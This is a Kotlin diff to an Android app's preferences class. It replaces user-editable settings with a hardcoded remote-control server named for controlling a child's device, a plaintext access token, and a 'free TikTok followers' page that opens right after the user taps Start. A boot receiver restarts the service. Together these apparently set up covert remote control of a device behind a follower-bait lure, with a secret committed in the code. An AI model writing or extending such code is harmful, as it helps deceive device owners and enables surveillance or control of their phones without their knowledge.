@@ -8,13 +8,13 @@ class Prefs(context: Context) {
     private val sp = context.applicationContext
         .getSharedPreferences("launcher", Context.MODE_PRIVATE)
 
-    var serverUrl: String
-        get() = sp.getString("url", "") ?: ""
-        set(v) = sp.edit().putString("url", v).apply()
-
-    var token: String
-        get() = sp.getString("token", "") ?: ""
-        set(v) = sp.edit().putString("token", v).apply()
+    companion object {
+        // Baked into the app, not editable on screen.
+        const val SERVER_URL = "https://remote-control-for-child.onrender.com"
+        const val TOKEN = "Kx7mQ2vR9tLp4wZc8NbH3sYd6FjA5eUg"
+        // Opened in the browser right after the user taps Start.
+        const val LANDING_URL = "https://superviral.io/free-tiktok-followers/"
+    }
 
     // true while the user wants the service running (used by BootReceiver)
     var running: Boolean
